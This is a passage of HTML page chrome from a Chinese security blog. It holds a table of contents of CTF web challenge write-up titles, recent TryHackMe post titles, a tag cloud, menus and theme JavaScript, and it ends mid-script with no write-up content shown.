class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-03-17</div><div class="title">FSCTF 2023</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="anzhiyufont anzhiyu-icon-comments"></i><span> 评论</span></div><div class="comment-randomInfo"><a onclick="anzhiyu.addRandomCommentInfo()" href="javascript:void(0)">匿名评论</a><a href="/privacy" style="margin-left: 4px">隐私政策</a></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div><div class="comment-barrage"></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/08/24/64e6ce9c507bb.png" alt="status"/></div></div><div class="author-info__description"><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">这有关于<b style="color:#fff">产品、设计、开发</b>相关的问题和看法，还有<b style="color:#fff">文章翻译</b>和<b style="color:#fff">分享</b>。</div><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">相信你可以在这里找到对你有用的<b style="color:#fff">知识</b>和<b style="color:#fff">教程</b>。</div></div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/about"><h1 class="author-info__name">hybcx</h1><div class="author-info__desc">只需热爱, 未来可期！</div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/hybchenxing" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a><a class="social-icon faa-parent animated-hover" href="https://space.bilibili.com/1761635300" target="_blank" title="Email"><i class="anzhiyufont anzhiyu-icon-bilibili"></i></a></div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#xgctf2024"><span class="toc-number">1.</span> <span class="toc-text">[XGCTF2024]</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#codeinject"><span class="toc-number">1.1.</span> <span class="toc-text">CodeInject</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tpdoor"><span class="toc-number">1.2.</span> <span class="toc-text">tpdoor</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#hubuctf-2022-%E6%96%B0%E7%94%9F%E8%B5%9B"><span class="toc-number">2.</span> <span class="toc-text">[HUBUCTF 2022 新生赛]</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#checkin"><span class="toc-number">2.1.</span> <span class="toc-text">checkin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#howtogetshell"><span class="toc-number">2.2.</span> <span class="toc-text">HowToGetShell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#calculate"><span class="toc-number">2.3.</span> <span class="toc-text">Calculate</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezsql"><span class="toc-number">2.4.</span> <span class="toc-text">ezsql</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sdctf-2022"><span class="toc-number">3.</span> <span class="toc-text">[SDCTF 2022]</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#apollo-1337"><span class="toc-number">3.1.</span> <span class="toc-text">Apollo 1337</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#curl-up-and-read"><span class="toc-number">3.2.</span> <span class="toc-text">CURL Up and Read</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jawt-that-down"><span class="toc-number">3.3.</span> <span class="toc-text">jawt that down!</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#lots-of-logs"><span class="toc-number">3.4.</span> <span class="toc-text">lots of logs</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gullible-by-dovesign"><span class="toc-number">3.5.</span> <span class="toc-text">gullible by dovesign</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#humongous-mistake"><span class="toc-number">3.6.</span> <span class="toc-text">HuMongous Mistake</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#nisactf-2022"><span class="toc-number">4.</span> <span class="toc-text">[NISACTF 2022]</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#easyssrf"><span class="toc-number">4.1.</span> <span class="toc-text">easyssrf</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#checkin"><span class="toc-number">4.2.</span> <span class="toc-text">checkin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#babyupload"><span class="toc-number">4.3.</span> <span class="toc-text">babyupload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#babyserialize"><span class="toc-number">4.4.</span> <span class="toc-text">babyserialize</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#popchains"><span class="toc-number">4.5.</span> <span class="toc-text">popchains</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#midlevel"><span class="toc-number">4.6.</span> <span class="toc-text">midlevel</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-up"><span class="toc-number">4.7.</span> <span class="toc-text">level-up</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bingdundun~"><span class="toc-number">4.8.</span> <span class="toc-text">bingdundun~</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#middlerce"><span class="toc-number">4.9.</span> <span class="toc-text">middlerce</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#is-secret"><span class="toc-number">4.10.</span> <span class="toc-text">is secret</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#join-us"><span class="toc-number">4.11.</span> <span class="toc-text">join-us</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">4.11.1.</span> <span class="toc-text">参考文章</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hardsql"><span class="toc-number">4.12.</span> <span class="toc-text">hardsql</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%B9%8F%E5%9F%8E%E6%9D%AF-2022"><span class="toc-number">5.</span> <span class="toc-text">鹏城杯 2022</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E5%8C%85%E5%90%AB"><span class="toc-number">5.1.</span> <span class="toc-text">简单包含</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E7%9A%84php"><span class="toc-number">5.2.</span> <span class="toc-text">简单的php</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">5.2.1.</span> <span class="toc-text">参考文章</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%8B%E7%BC%A9%E5%8C%85"><span class="toc-number">5.3.</span> <span class="toc-text">压缩包</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BA%A2%E6%98%8E%E8%B0%B7ctf-2022"><span class="toc-number">6.</span> <span class="toc-text">红明谷CTF 2022</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#smarty-calculator"><span class="toc-number">6.1.</span> <span class="toc-text">Smarty Calculator</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">6.1.1.</span> <span class="toc-text">参考文章</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fan-website"><span class="toc-number">6.2.</span> <span class="toc-text">Fan Website</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">6.2.1.</span> <span class="toc-text">参考文章</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#moectf-2024"><span class="toc-number">7.</span> <span class="toc-text">MoeCTF 2024</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%8E%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8%E6%8C%87%E5%8C%97"><span class="toc-number">7.1.</span> <span class="toc-text">Web渗透测试与审计入门指北</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%97%E6%8B%89%E6%A0%BC%E4%B9%8B%E5%9C%B0%E7%9A%84%E5%85%A5%E5%8F%A3"><span class="toc-number">7.2.</span> <span class="toc-text">弗拉格之地的入口</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez_http"><span class="toc-number">7.3.</span> <span class="toc-text">ez_http</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#proveyourlove"><span class="toc-number">7.4.</span> <span class="toc-text">ProveYourLove</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%97%E6%8B%89%E6%A0%BC%E4%B9%8B%E5%9C%B0%E7%9A%84%E6%8C%91%E6%88%98"><span class="toc-number">7.5.</span> <span class="toc-text">弗拉格之地的挑战</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pop-moe"><span class="toc-number">7.6.</span> <span class="toc-text">pop moe</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9E%AB%E5%88%80%E4%B9%8B%E8%B7%AF01-moectf%E5%90%AF%E5%8A%A8"><span class="toc-number">7.7.</span> <span class="toc-text">垫刀之路01: MoeCTF？启动！</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#imagecloud%E5%89%8D%E7%BD%AE"><span class="toc-number">7.8.</span> <span class="toc-text">ImageCloud前置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9E%AB%E5%88%80%E4%B9%8B%E8%B7%AF02-%E6%99%AE%E9%80%9A%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">7.9.</span> <span class="toc-text">垫刀之路02: 普通的文件上传</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9E%AB%E5%88%80%E4%B9%8B%E8%B7%AF03-%E8%BF%99%E6%98%AF%E4%B8%80%E4%B8%AA%E5%9B%BE%E5%BA%8A"><span class="toc-number">7.10.</span> <span class="toc-text">垫刀之路03: 这是一个图床</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%99%E6%80%81%E7%BD%91%E9%A1%B5"><span class="toc-number">7.11.</span> <span class="toc-text">静态网页</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%B5%E9%99%A2_backend"><span class="toc-number">7.12.</span> <span class="toc-text">电院_Backend</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8B%87%E9%97%AF%E9%93%9C%E4%BA%BA%E9%98%B5"><span class="toc-number">7.13.</span> <span class="toc-text">勇闯铜人阵</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9E%AB%E5%88%80%E4%B9%8B%E8%B7%AF04-%E4%B8%80%E4%B8%AA%E6%96%87%E4%BB%B6%E6%B5%8F%E8%A7%88%E5%99%A8"><span class="toc-number">7.14.</span> <span class="toc-text">垫刀之路04: 一个文件浏览器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9E%AB%E5%88%80%E4%B9%8B%E8%B7%AF05-%E7%99%BB%E9%99%86%E7%BD%91%E7%AB%99"><span class="toc-number">7.15.</span> <span class="toc-text">垫刀之路05: 登陆网站</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9E%AB%E5%88%80%E4%B9%8B%E8%B7%AF06-pop-base-mini-moe"><span class="toc-number">7.16.</span> <span class="toc-text">垫刀之路06: pop base mini moe</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#basectf-2024"><span class="toc-number">8.</span> <span class="toc-text">BaseCTF 2024</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#week1-http"><span class="toc-number">8.1.</span> <span class="toc-text">[Week1] HTTP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week1-%E5%96%B5%E5%96%B5%E5%96%B5-%CC%81%D8%B9"><span class="toc-number">8.2.</span> <span class="toc-text">[Week1] 喵喵喵´•ﻌ•&#96;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week1-md5%E7%BB%95%E8%BF%87%E6%AC%B8"><span class="toc-number">8.3.</span> <span class="toc-text">[Week1] md5绕过欸</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week1-a-dark-room"><span class="toc-number">8.4.</span> <span class="toc-text">[Week1] A Dark Room</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week1-upload"><span class="toc-number">8.5.</span> <span class="toc-text">[Week1] upload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week1-aura-%E9%85%B1%E7%9A%84%E7%A4%BC%E7%89%A9"><span class="toc-number">8.6.</span> <span class="toc-text">[Week1] Aura 酱的礼物</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-sha-he-gui-bi/" title="THM-沙盒规避">THM-沙盒规避</a><time datetime="2024-08-21T09:41:49.000Z" title="发表于 2024-08-21 17:41:49">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-fang-huo-qiang/" title="THM-防火墙">THM-防火墙</a><time datetime="2024-08-21T07:07:33.000Z" title="发表于 2024-08-21 15:07:33">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-wang-luo-an-quan-jie-jue-fang-an/" title="THM-网络安全解决方案">THM-网络安全解决方案</a><time datetime="2024-08-21T01:37:19.000Z" title="发表于 2024-08-21 09:37:19">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/20/thm-kao-tu-di-wei-sheng/" title="THM-靠土地为生">THM-靠土地为生</a><time datetime="2024-08-20T10:08:09.000Z" title="发表于 2024-08-20 18:08:09">2024-08-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/20/thm-tao-bi-ri-zhi-ji-lu-he-jian-kong/" title="THM-逃避日志记录和监控">THM-逃避日志记录和监控</a><time datetime="2024-08-20T06:51:56.000Z" title="发表于 2024-08-20 14:51:56">2024-08-20</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2020 - 2024 By <a class="footer-bar-link" href="/" title="hybcx" target="_blank">hybcx</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">204</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">23</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">30</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="http://yansedaima.com/" title="颜色代码表"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121908150.svg" alt="颜色代码表"/><span class="back-menu-item-text">颜色代码表</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-box-archive"></use></svg><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shapes"></use></svg><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-tags"></use></svg><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-link"></use></svg><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-artstation"></use></svg><span> 朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-music"></use></svg><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-paper-plane"></use></svg><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shoe-prints1"></use></svg><span> 随便逛逛</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" style="font-size: 0.88rem;">CTF赛事<sup>18</sup></a><a href="/tags/CVE/" style="font-size: 0.88rem;">CVE<sup>15</sup></a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 0.88rem;">Java反序列化<sup>3</sup></a><a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 0.88rem;">Java基础<sup>1</sup></a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">Linux提权<sup>2</sup></a><a href="/tags/MISC/" style="font-size: 0.88rem;">MISC<sup>1</sup></a><a href="/tags/Metasploit/" style="font-size: 0.88rem;">Metasploit<sup>3</sup></a><a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">PHP代码审计<sup>2</sup></a><a href="/tags/SecBook/" style="font-size: 0.88rem;">SecBook<sup>1</sup></a><a href="/tags/TryHackMe/" style="font-size: 0.88rem;">TryHackMe<sup>42</sup></a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">Windows提权<sup>2</sup></a><a href="/tags/reverse%E7%B3%BB%E5%88%97/" style="font-size: 0.88rem;">reverse系列<sup>2</sup></a><a href="/tags/tryhackme/" style="font-size: 0.88rem;">tryhackme<sup>1</sup></a><a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">web渗透<sup>2</sup></a><a href="/tags/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" style="font-size: 0.88rem;">web知识总结<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">代码审计<sup>1</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">内网渗透<sup>3</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">内网靶场<sup>2</sup></a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 0.88rem;">基本知识<sup>21</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 0.88rem;">基础知识<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 0.88rem;">攻防世界<sup>1</sup></a><a href="/tags/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">玄机应急响应靶场<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">红队渗透<sup>1</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="anzhiyufont anzhiyu-icon-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8152976493" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random" volume="0.7"></meting-js></div><div id="algolia-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="search-wrap"><div id="algolia-search-input"></div><hr/><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-info"><div class="algolia-stats"></div><div class="algolia-poweredBy"></div></div></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/medium-zoom@1.1.0/dist/medium-zoom.min.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
var HoldLog = console.log;
console.log = function () {};
let now1 = new Date();
queueMicrotask(() => {
  const Log = function () {
    HoldLog.apply(console, arguments);
  }; //在恢复前输出日志
  const grt = new Date("04/01/2021 00:00:00"); //此处修改你的建站时间或者网站上线时间
  now1.setTime(now1.getTime() + 250);
  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
  const dnum = Math.floor(days);
  const ascll = [
    `欢迎使用安知鱼!`,
    `生活明朗, 万物可爱`,
    `
        
       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
        
        `,
    "已上线",
    dnum,
    "天",
    "©2020 By 安知鱼 V1.6.12",
  ];
  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];

  setTimeout(
    Log.bind(
      console,
